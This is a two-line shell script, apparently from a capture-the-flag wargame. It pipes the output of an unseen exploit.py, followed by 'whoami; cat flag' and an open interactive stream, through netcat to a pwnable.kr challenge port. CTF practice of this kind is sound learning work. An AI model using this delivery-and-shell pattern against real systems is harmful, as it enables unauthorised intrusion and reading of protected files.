#!/bin/sh
(python exploit.py; echo 'whoami; cat flag'; cat) | nc pwnable.kr 9000
